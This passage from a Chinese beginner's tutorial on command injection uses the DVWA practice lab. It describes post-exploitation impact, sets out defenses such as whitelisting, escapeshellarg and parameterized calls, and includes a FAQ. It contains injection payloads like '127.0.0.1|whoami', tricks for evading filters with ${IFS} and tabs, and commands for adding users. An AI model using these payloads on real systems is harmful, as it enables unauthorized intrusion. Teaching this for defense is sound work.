拿到一台服务器还不够，还可以继续扩大战果：

1. **传文件/下载木马**
   - 可以用命令从黑客的服务器下载木马文件
   - 比如用 `certutil` 命令（Windows）或者 `wget`、`curl`（Linux）
   - 下载了木马之后，就可以完全控制服务器了

2. **内网渗透**
   - 拿这台服务器当"跳板机"，攻击内网里的其他机器
   - 很多时候，外网的服务器防护比较好，但内网的机器防护很差
   - 所以一旦打进内网，往往能拿下一大堆机器

3. **搞破坏**
   - 删文件、删数据库、格式化硬盘……
   - 当然这种一般是报复性行为，正经黑客不会这么干（因为没钱赚），但遇到恶意攻击者就麻烦了

4. **挂黑页、篡改网站**
   - 把网站首页改成黑客的"装逼页"
   - 或者植入广告、植入恶意代码

### 6.7.4 总结：服务器基本就没了

说了这么多，总结成一句话：**命令注入一旦成功，这台服务器基本上就等于拱手让人了！**

黑客想干啥干啥，想看啥看啥，想拿啥拿啥。你的数据、你的代码、你的用户信息……全都暴露了！

所以说，命令注入是一个**非常高危**的漏洞，严重程度拉满的那种。大家一定要重视！

---

## 6.8 命令注入防御方法

讲了这么多攻击方法，咱们也得说说怎么防御。毕竟学攻击是为了更好地防御嘛！🛡️

那怎么防御命令注入呢？给大家总结几个方法，从最有效到次有效排序：

### 6.8.1 尽量不要用系统命令函数

这是最根本的方法：**如果能不用系统命令，就不要用！**

很多时候，调用系统命令只是图省事，但其实用编程语言本身的功能也能实现。比如：

- 要ping一个IP？可以用PHP的socket功能自己实现，不一定非要调用系统的ping命令
- 要查看文件？用PHP的文件操作函数就行，不用调用type/cat命令
- 要发送邮件？用PHPMailer之类的库，不用调用系统的sendmail

只要你不调用系统命令，那命令注入自然就无从谈起了。

**能不用就不用，这是最安全的。**

### 6.8.2 如果一定要用，用白名单限制输入

如果业务需求确实需要调用系统命令，那就要严格限制用户的输入。

**用白名单，不要用黑名单！** 这个咱们前面反复强调过了。

具体怎么做呢？

**方法一：严格限制输入格式**
就像Impossible级别那样，规定输入必须是什么格式。比如：
- 只能是IP地址 → 验证是不是IP格式
- 只能是数字 → 验证是不是数字
- 只能是字母 → 验证是不是纯字母
- 只能是特定的几个值 → 用switch或者in_array判断

只有完全符合格式的输入才接受，不符合的直接拒绝。

**方法二：只能选择，不能输入**
如果可能的话，用下拉菜单、单选框等方式让用户选择，而不是让用户自由输入。这样用户就只能在你给定的选项里选，自然没法注入了。

比如要ping的IP只有几个固定的，那就做成下拉菜单，让用户选，而不是让用户自己输。

### 6.8.3 对用户输入进行严格的转义和过滤

如果白名单实在不好做（比如输入内容比较复杂），那也要做好转义和过滤。

虽然黑名单不可靠，但有总比没有强，再配合其他措施，也能提高安全性。

具体做法：

1. **转义特殊字符**
   - PHP里可以用 `escapeshellcmd()` 和 `escapeshellarg()` 函数
   - `escapeshellarg()` 是把字符串转成安全的命令行参数，非常好用
   - 比如：`$target = escapeshellarg($_GET['ip']);`
   - 这样用户输入就只会被当成一个参数，而不会被解析成命令

2. **过滤危险字符**
   - 把 `&`、`|`、`;`、`$`、`` ` ``、`(`、`)` 这些危险字符都过滤掉
   - 虽然黑名单不可靠，但至少能挡住脚本小子

3. **限制命令长度**
   - 限制输入的长度，太长了直接拒绝

### 6.8.4 用参数化的方式调用，不要拼接字符串

很多人写代码喜欢直接拼接字符串，比如：
```php
$cmd = "ping " . $ip;
```
这是非常不安全的！

正确的做法是用参数化的方式，把命令和参数分开。比如：

- PHP里可以用 `proc_open()`，指定命令和参数数组
- Python里的 `subprocess` 模块，用列表传参
- Java里的 `Runtime.exec()` 也有带数组参数的版本

这样参数就只会被当成参数，不会被解析成命令，自然就不会有注入了。

### 6.8.5 其他防御措施

除了上面这些，还有一些辅助的防御手段：

1. **降低服务权限**
   - 让网站运行在权限很低的用户下，比如Windows的IUSR，Linux的www-data
   - 这样就算被注入了，能干的事情也有限，把损失降到最低

2. **禁用危险函数**
   - 在php.ini里禁用 `system()`、`exec()`、`shell_exec()` 这些危险函数
   - 如果网站根本用不到这些函数，直接禁用了最安全

3. **WAF（Web应用防火墙）**
   - 部署WAF，WAF可以检测常见的命令注入攻击，自动拦截
   - 当然WAF也不是万能的，也可能被绕过，但作为一层防护还是不错的

4. **日志监控**
   - 记录网站的访问日志，发现异常及时报警
   - 比如短时间内大量奇怪的输入，可能就是有人在搞注入测试

### 6.8.6 防御方法总结

总结一下，防御命令注入的优先级是：

1. 🥇 **能不用系统命令就不用** —— 最彻底
2. 🥈 **白名单验证输入格式** —— 最有效
3. 🥉 **转义/过滤用户输入** —— 聊胜于无
4. **参数化调用，不拼接字符串** —— 好习惯
5. **权限控制、禁用函数、WAF……** —— 辅助手段

多层防护，层层把关，才能把风险降到最低！

---

## 6.9 新手常见问题FAQ

很多新手刚开始学命令注入的时候，都会遇到各种各样的问题。这里我整理了一些最常见的，给大家解答一下。

### 6.9.1 为什么我输入了payload，但命令没执行？

这是新手最常遇到的问题。可能的原因有很多，挨个排查：

**1. 符号用错了**
- 比如Windows和Linux支持的符号不太一样
- Windows下 `;` 一般不能用，Linux下可以
- 试试换几个符号，比如 &、|、&&、|| 都试试

**2. 空格被过滤了**
- 有些情况空格会被过滤，这时候可以用其他字符代替空格
- 比如 `<`、`>`、`%09`（TAB）、`${IFS}`（Linux下）等等

**3. 命令不存在**
- 比如Windows下用 `ls` 肯定不行，得用 `dir`
- Linux下用 `ipconfig` 也不行，得用 `ifconfig` 或 `ip a`
- 确认一下目标系统是Windows还是Linux，用对应的命令

**4. 权限不够**
- 有些命令需要管理员权限才能执行
- 比如添加用户、改系统配置这些，普通用户可能干不了

**5. 有过滤，你没绕过**
- 可能你以为是Low级别，但实际上是Medium或High
- 检查一下DVWA的难度设置对不对
- 看看源码，过滤了啥，然后想办法绕过

### 6.9.2 Windows和Linux的命令注入有什么区别？

主要是命令和符号不太一样：

| 功能 | Windows | Linux |
|------|---------|-------|
| 查看当前用户 | `whoami` | `whoami` |
| 查看IP | `ipconfig` | `ifconfig` 或 `ip a` |
| 列文件 | `dir` | `ls` |
| 看文件内容 | `type 文件名` | `cat 文件名` |
| 命令分隔符 | `&`、`&&`、`\|\|`、`\|` | `;`、`&`、`&&`、`\|\|`、`\|` |
| 命令替换 | 不太常用 | `` `命令` `` 或 `$(命令)` |
| 系统版本 | `ver` 或 `systeminfo` | `uname -a` 或 `cat /etc/issue` |
| 加用户 | `net user 用户名 密码 /add` | `useradd 用户名` 或 `adduser 用户名` |

大家记不住也没关系，用到的时候查一下就行。

### 6.9.3 命令注入和代码注入有什么区别？

很多新手搞不清这两个，简单说一下：

- **命令注入**：注入的是**系统命令**（比如CMD、Shell命令），执行的是系统命令
- **代码注入**：注入的是**编程语言代码**（比如PHP代码、Python代码），执行的是脚本语言代码

举个例子：
- 命令注入：你输入 `127.0.0.1 && whoami`，服务器执行了 `whoami` 这个系统命令
- 代码注入：你输入 `<?php phpinfo(); ?>`，服务器执行了这段PHP代码

两者都很危险，但原理不太一样。不过有时候界限也不是特别清晰，大概知道就行。

### 6.9.4 命令注入和SQL注入有什么区别？

这个也经常有人搞混：

- **命令注入**：注入的是**系统命令**，目标是操作系统
- **SQL注入**：注入的是**SQL语句**，目标是数据库

一个是打系统，一个是打数据库，都很厉害，但不是一回事。SQL注入咱们后面会专门讲。

### 6.9.5 学命令注入有什么用？我又不当黑客

问得好！咱们学这些，不是为了当黑客去搞破坏，而是为了：

1. **做安全防护**
   - 如果你是开发者，你得知道命令注入是怎么回事，才能写出安全的代码
   - 如果你是运维，你得知道怎么检测和防御命令注入

2. **渗透测试**
   - 如果你做安全行业，比如渗透测试工程师，那这些都是必备技能
   - 你得先知道怎么攻击，才能知道怎么防御，才能帮客户找出漏洞

3. **提高安全意识**
   - 了解了漏洞的危害，你才会更重视安全
   - 平时上网、写代码的时候，都会多留个心眼

总之，技术本身没有好坏，关键看用的人。咱们要用技术做好事，做白帽子，用技术保护别人，而不是伤害别人。💪

---

## 6.10 本章总结

好了，第6章到这儿就差不多了。内容挺多的，咱们来总结一下今天都学了啥：

### 6.10.1 本章知识点回顾 📝

1. **什么是命令注入**
   - 黑客通过网页输入框，让服务器执行系统命令
   - 就像餐厅点菜顺便要菜刀的例子
   - 根本原因：用户输入直接拼接到命令里，没过滤或过滤不严

2. **管道符/命令连接符**
   - `&`：前面执行完执行后面（不管成败）
   - `&&`：前面成功才执行后面
   - `|`：把前面的输出传给后面当输入
   - `||`：前面失败才执行后面
   - `;`：依次执行（Linux常用）
   - 记住：黑名单过滤不可靠！

3. **Low级别**
   - 什么防护都没有，直接拼接执行
   - 用 `127.0.0.1 && whoami` 直接成功
   - 裸奔状态，非常危险

4. **Medium级别**
   - 黑名单过滤了 `&&` 和 `;`
   - 换 `&` 或 `|` 就能绕过
   - 黑名单不可靠的典型例子

5. **High级别**
   - 过滤了更多符号
   - 但 `| `（竖线加空格）过滤不严谨
   - 用 `127.0.0.1|whoami`（不加空格）绕过
   - 还是黑名单，总有疏漏

6. **Impossible级别**
   - 白名单验证，严格限制IP格式
   - 必须是4段数字组成的IP才能通过
   - 这才是正确的防御方式

7. **漏洞危害**
   - 查看系统信息、文件内容
   - 添加用户、开远程桌面
   - 传木马、提权、内网渗透
   - 基本上服务器就没了

8. **防御方法**
   - 尽量不用系统命令（最彻底）
   - 白名单验证输入格式（最有效）
   - 转义过滤用户输入（聊胜于无）
   - 参数化调用，不拼接字符串
   - 权限控制、禁用函数、WAF辅助

### 6.10.2 给新手的一些建议 💡

学完这一章，有些新手可能会觉得："哇，命令注入好厉害啊，我以后随便找个网站就能注入了！"

打住打住！🙅‍♂️ 我必须给大家泼点冷水：

**第一，现实中的网站，大部分都有防护的。**
你看DVWA的Low级别都是没防护的，但现实中这么傻的网站已经很少了。正经网站都会做好输入验证，哪有那么容易让你注入。

**第二，命令注入是违法的！**
重要的事情说三遍：**不要去注入别人的网站！不要去注入别人的网站！不要去注入别人的网站！**

我们学习这些技术，是为了防护，不是为了攻击。你只能在自己搭的靶场里练习，或者在有授权的情况下做渗透测试。未经允许去搞别人的网站，那是违法行为，是要坐牢的！⚠️

**第三，防御比攻击更重要。**
我们学命令注入，最终目的是知道怎么防御它。作为开发者，要写安全的代码；作为普通用户，要知道保护自己的数据。

好了，鸡汤就灌到这儿。希望大家都能做一个遵纪守法的白帽子！👍

### 6.10.3 下章预告 📢

这一章我们学了命令注入，是不是感觉很刺激？下一章我们要学习一个新的漏洞——**CSRF（跨站请求伪造）**！

CSRF又是啥呢？简单说就是"借刀杀人"——利用你已经登录的身份，在你不知情的情况下，以你的名义干坏事！比如你登录了网上银行，然后点了个链接，钱就没了……是不是很吓人？

下一章咱们就来好好聊聊CSRF，看看它到底是怎么回事，又该怎么防御。准备好了吗？咱们下章见！👋

---

**加油，小伙伴们！学习的路上虽然有点辛苦，但每学会一个新技能，你就离大神更近一步！💪 我们下章见！**
